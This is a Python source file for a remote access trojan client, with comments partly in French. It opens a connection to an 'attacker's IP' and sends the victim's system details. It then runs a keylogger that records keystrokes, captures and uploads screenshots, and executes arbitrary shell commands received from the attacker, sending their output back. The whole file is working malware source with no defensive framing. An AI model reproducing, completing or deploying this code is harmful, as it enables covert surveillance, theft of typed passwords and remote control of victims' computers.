#!/usr/bin/python3.7
# -*- coding: utf-8 -*
import socket, subprocess, os, platform, logging, threading,time, encrypted_connection
import pyscreenshot as ImageGrab
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
class KeyLoggerThread(threading.Thread):
    global Quit
    def __init__(self):
        super().__init__()

    def run(self):
        logging.basicConfig(filename="keys.log",level=logging.DEBUG, format='%(asctime)s %(message)s')
        def on_press(key):
            logging.debug(str(key))
            if key == Key.esc:
                return False
        with Listener(on_press = on_press) as listener:
            listener.join()


 
HOST = "192.168.0.14"  # attacker's IP adress (this is a random one, just to show you)
PORT = 6969 # attacker's port on which server is listening
 
# same syntax here as for the server
connexion_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connexion_socket.connect((HOST, PORT))
print("\n[*] Connected to " +HOST+ " on port " +str(PORT)+ ".\n")
KeyLoggerThread = KeyLoggerThread()
KeyLoggerThread.start()
#encrypter = encrypted_connection.encrypter(b"d41d8cd98f00b204")
connexion_socket.send(("Nom : "+os.name+"\nSysteme : "+platform.system()+"\nKernel : "+ platform.release()).encode("utf-8"))
 
while True:
    command = ""
    command = connexion_socket.recv(1024).decode("utf-8")
    split_command = command.split()
    print("Received command : " +command)

    if(command.split()[0] == "cd"):
            if len(command.split()) == 1:
                connexion_socket.send((os.getcwd()))
            elif len(command.split()) == 2:
                try:
                    os.chdir(command.split()[1])
                    connexion_socket.send(("Changed directory to " + os.getcwd()).encode("utf-8"))
                except OSError as winerror:
                    connexion_socket.send(("No such directory : " +os.getcwd()).encode("utf-8"))
    elif command == "stb" :
        im = ImageGrab.grab()
        im.save('pic.png')
        connexion_socket.send(("capturing").encode("utf-8"))
        pic = open("pic.png", "rb")
        picRead = pic.read(1024)
        while picRead != b'':
            connexion_socket.send(picRead)
            picRead = pic.read(1024)
        pic.close()
        os.remove("pic.png")
        connexion_socket.send(("complete").encode("utf-8"))
    elif command == "keylogger.status" :
        if KeyLoggerThread.isAlive() :
            connexion_socket.send(("ACTIVATED").encode("utf-8"))
        else :
            connexion_socket.send(("DISACTIVATED").encode("utf-8"))
    elif command == "keylogger.activate" :
        if KeyLoggerThread.isAlive() :
            connexion_socket.send(("ALREADY ACTIVATED").encode("utf-8"))
        else :
            KeyLoggerThread.start()
            connexion_socket.send(("THE KEYLOGGER HAS BEEN ACTIVATED").encode("utf-8"))
    elif command == "keylogger.deactivate" :
        if KeyLoggerThread.isAlive() :
            Listener.stop()
            connexion_socket.send(("KEYLOGGER DEACTIVATED").encode("utf-8"))

        else :
            connexion_socket.send(("ALREADY DEACTIVATED").encode("utf-8"))

 
    else:
        # do shell command
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        stdout_value = stdout_value.decode("utf-8")
        # send output to attacker
        print(stdout_value)
        if(stdout_value != ""):
            connexion_socket.send(stdout_value.encode("utf-8"))  # renvoit l'output  à l'attaquant
        else:
            connexion_socket.send((command+ " does not return anything").encode("utf-8"))
Quit = False
connexion_socket.close()